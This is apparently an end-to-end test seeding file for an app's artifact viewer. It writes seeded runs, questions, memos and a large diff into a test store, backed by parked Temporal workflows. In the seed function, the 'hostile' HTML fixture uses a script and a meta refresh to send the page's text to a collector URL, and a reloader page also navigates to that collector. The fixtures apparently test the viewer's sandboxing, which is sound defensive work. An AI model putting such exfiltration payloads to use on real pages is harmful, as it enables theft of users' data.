/**
 * Test-side seeding for the artifact-view specs (F05, F13), and the helpers the keyboard spec's seeding builds on
 * (keyboard-seed.ts, R5): runs written straight into the suite's own store (BYWAY_E2E_DATA_DIR) through @byway/store,
 * after the demo server is up. No product route writes them.
 *
 * Why this is sound: the Run screen reads runs from the store only (the runner's view), so a run written here shows as
 * it was written, as long as the engine leaves it alone. The engine's lost-run pass runs at start and again every few
 * minutes while it runs (block 2; dev-engine.ts reconcileWhilePolling): it fails every going run whose workflow
 * Temporal is not running, and withdraws its questions, so a pass falling while a spec used a seeded question would end
 * it under the spec (STORE-1 of block 2's check). So each seeded run has a workflow of its own while it is going: a run
 * workflow under the run's workflow id, started on a task queue no worker polls (PARKED_QUEUE), so no step of it ever
 * runs, and the pass, which stops only its own queue's orphans, reads the run as still going. The workflow is parked
 * before the run is written and terminated once the run has ended, so no pass sees the run going without it. The
 * seeding then runs the pass itself, and fails if the pass would end any run it seeded.
 *
 * A seeded question has no real workflow behind it, so the specs never answer one; `unseed` withdraws them, ends the
 * runs and terminates their parked workflows, so nothing seeded is left waiting for later specs. The Run screen shows
 * one question at a time, so each question kind gets its own run.
 */
import { randomUUID } from 'node:crypto';
import { Client, Connection, WorkflowNotFoundError } from '@temporalio/client';
import type { CheckpointKind, CheckpointOption, Medium, RunEvent } from '@byway/contracts';
import { reconcileLostRuns, RUN_WORKFLOW, workflowIdFor } from '@byway/runner/client';
import { createStore, type SqliteStore } from '@byway/store';

export interface SeededRun {
  runId: string;
  checkpointId?: string;
}

export interface Seeded {
  /** A hostile page: its script, or its meta refresh a second later, carries its text to the collector. */
  hostile: string;
  /** A page that, once its scripts run, reloads itself from inside its frame. */
  reloader: string;
  /** 19.5 KB of Markdown whose last words are MEMO_TAIL, with a link to the hostile page at its start. */
  memo: string;
  /** A 54 KB unified diff: 12 files, +480 −480. */
  diff: string;
  /** Two memos of about 17 KB that differ only in their closing paragraph. */
  memoA: string;
  memoB: string;
  /** Ended: the four step artifacts above, and the hostile page as its deliverable. */
  done: SeededRun;
  pick: SeededRun;
  compare: SeededRun;
  react: SeededRun;
}

export const MEMO_TAIL = 'F13 memo tail sentinel: the last sentence of the long memo.';
export const ENDING_A = 'F13 ending A: we will pursue the synergies.';
export const ENDING_B = 'F13 ending B: we will fund the three projects above.';
/** What the hostile page posts to its frame's parent when its scripts run. */
export const RAN = 'byway-e2e:ran';

export function seedDataDir(): string | undefined {
  return process.env.BYWAY_E2E_DATA_DIR;
}

export function openStore(): SqliteStore {
  const dataDir = seedDataDir();
  if (!dataDir) throw new Error('BYWAY_E2E_DATA_DIR is not set: run the suite with pnpm e2e or the Playwright config.');
  return createStore({ dataDir });
}

/** The task queue the seeded runs' workflows are parked on: no worker polls it, so none of their steps ever runs. */
export const PARKED_QUEUE = 'byway-e2e-parked';

/** What seeding writes to: the suite's own store, and its byway's engine (BYWAY_E2E_TEMPORAL_ADDRESS). */
export interface Seeding {
  store: SqliteStore;
  engine: Client;
  /** The runs this seeding wrote that are still going, ended if it fails part way. */
  going: Set<string>;
}

/**
 * Opens the store and a connection to the engine for `use`, and closes both after it. A `use` that fails part way ends
 * the runs it left going (cancelled, their workflows released), so a failed seeding leaves no question open for later
 * specs.
 */
export async function seeding<T>(use: (s: Seeding) => Promise<T>): Promise<T> {
  const address = process.env.BYWAY_E2E_TEMPORAL_ADDRESS;
  if (!address) throw new Error('BYWAY_E2E_TEMPORAL_ADDRESS is not set: run the suite with pnpm e2e or the Playwright config.');
  const connection = await Connection.connect({ address });
  try {
    const store = openStore();
    const s: Seeding = { store, engine: new Client({ connection }), going: new Set() };
    try {
      return await use(s);
    } catch (e) {
      for (const runId of [...s.going]) await cancelSeeded(s, [runId]).catch(() => undefined);
      throw e;
    } finally {
      store.close();
    }
  } finally {
    await connection.close();
  }
}

/** Ends a seeded run's parked workflow, once the run has ended in the store. A workflow already ended is left as it is. */
async function release(s: Seeding, runId: string): Promise<void> {
  try {
    await s.engine.workflow.getHandle(workflowIdFor(runId)).terminate('e2e: the seeded run ended');
  } catch (e) {
    if (!(e instanceof WorkflowNotFoundError)) throw e;
  }
}

/** Ends a seeded run as done, with its deliverable, then releases its workflow. */
export async function finish(s: Seeding, runId: string, outputArtifactId: string): Promise<void> {
  await s.store.appendEvent({ runId, type: 'run-finished', data: {} });
  await s.store.updateRun(runId, { status: 'done', outputArtifactId });
  await release(s, runId);
  s.going.delete(runId);
}

/** Ends seeded runs that are still going: their questions withdrawn, the runs cancelled, then their workflows released. */
export async function cancelSeeded(s: Seeding, runIds: readonly string[]): Promise<void> {
  for (const runId of runIds) {
    await s.store.withdrawCheckpoints(runId);
    await s.store.updateRun(runId, { status: 'cancelled' });
    await release(s, runId);
    s.going.delete(runId);
  }
}

/**
 * Runs the engine's lost-run pass once, as the engine repeats it while it runs (reconcileWhilePolling: the default
 * workspace, byway's own queue, queued runs with no workflow left alone), and fails if it ended any of these seeded runs: they would not
 * have outlasted a pass falling while a spec used them.
 */
export async function outlastLostRunPass(s: Seeding, runIds: readonly string[]): Promise<void> {
  const workspace = await s.store.ensureDefaultWorkspace();
  const { lost } = await reconcileLostRuns(s.engine, s.store, [workspace.id], { whilePolling: true });
  const ended = runIds.filter((id) => lost.includes(id));
  if (ended.length > 0) throw new Error(`The engine's lost-run pass ended ${ended.length} of the ${runIds.length} seeded runs (${ended.join(', ')}): their parked workflows are not running.`);
}

const paragraph = (i: number) =>
  `Paragraph ${i}. The quarter went much as planned: the team shipped the two releases it promised, hired for the open roles, and kept spending inside the budget the board agreed in spring. ` +
  'Nothing here changes the plan; it records what happened and what comes next, in that order, so the reader can check it.';

/** Markdown of at least `bytes` bytes, ending with `ending`. */
function memoText(title: string, bytes: number, ending: string, lead = ''): string {
  const parts = [`# ${title}`, lead];
  for (let i = 1; Buffer.byteLength(parts.join('\n\n')) < bytes; i++) parts.push(paragraph(i));
  parts.push(ending);
  return parts.filter((p) => p !== '').join('\n\n');
}

/** 12 files, each one hunk of 40 removed and 40 added lines: +480 −480, about 54 KB. */
function diffText(): string {
  const files: string[] = [];
  for (let f = 1; f <= 12; f++) {
    const lines = [`diff --git a/src/module-${f}.ts b/src/module-${f}.ts`, `--- a/src/module-${f}.ts`, `+++ b/src/module-${f}.ts`, '@@ -1,40 +1,40 @@'];
    for (let i = 1; i <= 40; i++) lines.push(`-export const setting${i} = readSetting('module-${f}-setting-${i}', 0);`);
    for (let i = 1; i <= 40; i++) lines.push(`+export const setting${i} = readSetting('module-${f}-setting-${i}', 1);`);
    files.push(lines.join('\n'));
  }
  return `${files.join('\n')}\n\nWhy: Every setting now defaults to 1, which the review asked for.`;
}

export async function stepWithArtifact(store: SqliteStore, runId: string, stepId: string, label: string, artifactId: string, mediaType: string): Promise<void> {
  const event = (type: RunEvent['type'], data: Record<string, unknown>) => store.appendEvent({ runId, type, stepId, data });
  await event('step-started', { label, stage: 'D2', actor: 'model' });
  await event('artifact', { artifactId, mediaType, label });
  await event('step-finished', { costUsd: 0 });
}

/** A going run, written once its workflow is parked, so the engine's lost-run pass never sees it without one. */
export async function newRun(s: Seeding, title: string, recipeId: string, medium: Medium): Promise<string> {
  const workspace = await s.store.ensureDefaultWorkspace();
  const runId = randomUUID();
  await s.engine.workflow.start(RUN_WORKFLOW, { taskQueue: PARKED_QUEUE, workflowId: workflowIdFor(runId), args: [] });
  await s.store.createRun({ id: runId, workspaceId: workspace.id, recipeId, recipeHash: 'e2e-seeded', profileId: 'demo', title, problem: title, medium, budgetUsd: 2, status: 'running' });
  s.going.add(runId);
  await s.store.appendEvent({ runId, type: 'run-started', data: { budgetUsd: 2 } });
  return runId;
}

/** A finished step shown before a seeded question, so its timeline has a step to open while the question is open. */
export interface EarlierStep {
  stepId: string;
  label: string;
  artifactId: string;
  mediaType: string;
}

export async function question(
  s: Seeding,
  title: string,
  recipeId: string,
  medium: Medium,
  kind: CheckpointKind,
  more: { options?: CheckpointOption[]; artifactIds?: string[]; k?: number },
  earlier: readonly EarlierStep[] = [],
): Promise<SeededRun> {
  const runId = await newRun(s, title, recipeId, medium);
  for (const step of earlier) await stepWithArtifact(s.store, runId, step.stepId, step.label, step.artifactId, step.mediaType);
  const stepId = `e2e-${kind}`;
  const checkpointId = randomUUID();
  await s.store.appendEvent({ runId, type: 'step-started', stepId, data: { label: 'Your choice', stage: 'D2', actor: 'human' } });
  await s.store.openCheckpoint({ id: checkpointId, runId, stepId, kind, prompt: `Seeded ${kind} question (do not answer)`, ...more });
  await s.store.appendEvent({ runId, type: 'checkpoint-opened', stepId, data: { checkpointId, kind } });
  return { runId, checkpointId };
}

export async function seed(collector: string): Promise<Seeded> {
  return seeding(async (s) => {
    const put = async (text: string, type: string) => (await s.store.artifacts.putText(text, type)).id;
    const hostile = await put(
      `<!doctype html><title>Hostile page</title><meta http-equiv="refresh" content="1;url=${collector}/hit?via=seeded-meta&amp;data=F05_SEEDED_SECRET"><p>F05_SEEDED_SECRET</p>` +
        `<script>parent.postMessage('${RAN}', '*'); location.href = '${collector}/hit?via=seeded-script&data=' + encodeURIComponent(document.body.innerText);</script>`,
      'text/html',
    );
    const reloader = await put(
      `<!doctype html><title>Reloading page</title><p>Reloads itself once its scripts run.</p>` +
        `<script>if (window.name !== 'reloaded') { window.name = 'reloaded'; parent.postMessage('ran:first', '*'); location.reload(); } else { parent.postMessage('ran:again', '*'); location.href = '${collector}/hit?via=seeded-reload'; }</script>`,
      'text/html',
    );
    const memo = await put(memoText('Quarterly memo', 19_400, MEMO_TAIL, `See [the draft page](/artifacts/${hostile}) for the launch.`), 'text/markdown');
    const diff = await put(diffText(), 'text/x-diff');
    const memoA = await put(memoText('Status memo', 17_000, ENDING_A), 'text/markdown');
    const memoB = await put(memoText('Status memo', 17_000, ENDING_B), 'text/markdown');

    const doneId = await newRun(s, 'Seeded: finished page (F05, F13)', 'c1', 'web-page');
    await stepWithArtifact(s.store, doneId, 'e2e-page', 'Hostile page', hostile, 'text/html');
    await stepWithArtifact(s.store, doneId, 'e2e-reload', 'Reloading page', reloader, 'text/html');
    await stepWithArtifact(s.store, doneId, 'e2e-memo', 'Long memo', memo, 'text/markdown');
    await stepWithArtifact(s.store, doneId, 'e2e-diff', 'Big diff', diff, 'text/x-diff');
    await finish(s, doneId, hostile);

    const pick = await question(s, 'Seeded: pick (F05)', 'c1', 'web-page', 'pick', {
      k: 1,
      options: [
        { id: 'a', label: 'Draft one', artifactId: hostile },
        { id: 'b', label: 'Draft two', artifactId: memoA },
      ],
    });
    const compare = await question(s, 'Seeded: compare (F13)', 'c4', 'prose', 'compare', {
      options: [
        { id: 'A', label: 'Before the swaps', artifactId: memoA },
        { id: 'B', label: 'After the swaps', artifactId: memoB },
      ],
    });
    const react = await question(s, 'Seeded: react (F05)', 'c1', 'web-page', 'react', { artifactIds: [hostile] });
    await outlastLostRunPass(s, [pick.runId, compare.runId, react.runId]);
    return { hostile, reloader, memo, diff, memoA, memoB, done: { runId: doneId }, pick, compare, react };
  });
}

/** Ends the seeded runs that are still going, withdrawing their questions, so no later spec sees them waiting. */
export async function unseed(seeded: Seeded | undefined): Promise<void> {
  if (!seeded) return;
  await seeding((s) => cancelSeeded(s, [seeded.pick.runId, seeded.compare.runId, seeded.react.runId]));
}
